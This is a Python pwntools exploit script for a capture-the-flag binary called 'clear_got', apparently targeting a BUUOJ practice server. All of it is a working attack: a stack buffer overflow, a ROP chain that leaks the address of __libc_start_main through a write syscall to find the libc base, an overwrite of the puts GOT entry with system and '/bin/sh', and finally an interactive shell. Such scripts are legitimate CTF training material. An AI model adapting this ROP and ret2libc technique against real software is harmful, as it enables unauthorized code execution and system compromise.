from pwn import *

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./clear_got"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 29096)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


bss = 0x601060 + 0x600
pop_rdi = 0x4007f3
pop_rsi_r15 = 0x4007f1
write_syscall = 0x400774
syscall = 0x40077e
putsplt = elf.plt['puts']
putsgot = elf.got['puts']
ret = 0x400539
start_got = elf.got['__libc_start_main']
move_rax_0 = 0x40075C

payload = b"a" * 0x60 + p64(0)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(start_got) + p64(1) + p64(write_syscall)
payload += p64(move_rax_0) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(putsgot) + p64(1) + p64(syscall)
payload += p64(pop_rdi) + p64(putsgot + 8) + p64(0x40071E)

ddebug("b *0x40077e")
io.sendafter("\n", payload)

libc_start_main = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
success("__libc_start_main -> " + hex(libc_start_main))
libc.address = libc_start_main - libc.symbols["__libc_start_main"]
success("libc address -> " + hex(libc.address))

payload = p64(libc.symbols["system"]) + b"/bin/sh\x00"
io.sendline(payload)
io.interactive()
